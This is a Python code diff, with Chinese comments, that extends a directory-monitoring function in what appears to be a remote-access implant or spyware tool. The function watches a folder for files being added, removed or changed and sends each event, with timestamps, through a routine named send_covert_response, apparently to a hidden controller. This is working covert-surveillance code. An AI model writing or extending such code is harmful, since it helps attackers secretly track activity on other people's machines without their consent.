@@ -181,56 +181,89 @@ def monitor_file(path):
 
 
 def monitor_directory(path):
-    """Monitor a directory for any file creations/deletions using polling."""
+    """
+    监控目录：新增、删除、以及根目录下文件内容修改（mtime 变化）。
+    """
     try:
         prev_contents = set(os.listdir(path))
+        # 记录每个文件的上次修改时间
+        prev_mtimes = {
+            f: os.path.getmtime(os.path.join(path, f))
+            for f in prev_contents
+            if os.path.isfile(os.path.join(path, f))
+        }
     except Exception as e:
-        msg = {
+        send_covert_response((json.dumps({
             "type": "MON_DIR_ERROR",
             "path": path,
-            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+            "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
             "content": f"Directory {path} not accessible: {e}"
-        }
-        send_covert_response((json.dumps(msg) + "\n").encode())
+        }) + "\n").encode())
         return
 
     while mon_dir_path == path:
         try:
             current_contents = set(os.listdir(path))
         except Exception as e:
-            msg = {
+            send_covert_response((json.dumps({
                 "type": "MON_DIR_ERROR",
                 "path": path,
-                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S", time.localtime()),
+                "timestamp": time.strftime("%Y-%m-%d %H:%M:%S"),
                 "content": f"Directory {path} inaccessible: {e}"
-            }
-            send_covert_response((json.dumps(msg) + "\n").encode())
+            }) + "\n").encode())
             break
 
-        # 新增文件
-        for a in current_contents - prev_contents:
-            ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        # 1) 新增文件
+        for fname in current_contents - prev_contents:
+            ts = time.strftime("%Y-%m-%d %H:%M:%S")
             msg = {
                 "type": "MON_DIR_ADDED",
                 "path": path,
-                "filename": a,
+                "filename": fname,
                 "timestamp": ts
             }
             send_covert_response((json.dumps(msg) + "\n").encode())
 
-        # 删除文件
-        for r in prev_contents - current_contents:
-            ts = time.strftime("%Y-%m-%d %H:%M:%S", time.localtime())
+        # 2) 删除文件
+        for fname in prev_contents - current_contents:
+            ts = time.strftime("%Y-%m-%d %H:%M:%S")
             msg = {
                 "type": "MON_DIR_REMOVED",
                 "path": path,
-                "filename": r,
+                "filename": fname,
                 "timestamp": ts
             }
             send_covert_response((json.dumps(msg) + "\n").encode())
+            # 移除记录的 mtime
+            prev_mtimes.pop(fname, None)
+
+        # 3) 已存在文件的内容修改（mtime 变化）
+        for fname in current_contents & prev_contents:
+            full = os.path.join(path, fname)
+            if not os.path.isfile(full):
+                continue
+            try:
+                curr_m = os.path.getmtime(full)
+            except Exception:
+                continue
+            old_m = prev_mtimes.get(fname)
+            if old_m is None:
+                prev_mtimes[fname] = curr_m
+                continue
+            if curr_m != old_m:
+                prev_mtimes[fname] = curr_m
+                ts = time.strftime("%Y-%m-%d %H:%M:%S")
+                msg = {
+                    "type": "MON_DIR_MODIFIED",
+                    "path": path,
+                    "filename": fname,
+                    "timestamp": ts
+                }
+                send_covert_response((json.dumps(msg) + "\n").encode())
 
         prev_contents = current_contents
         time.sleep(1)
+
 
 
 def stop_monitor_file():
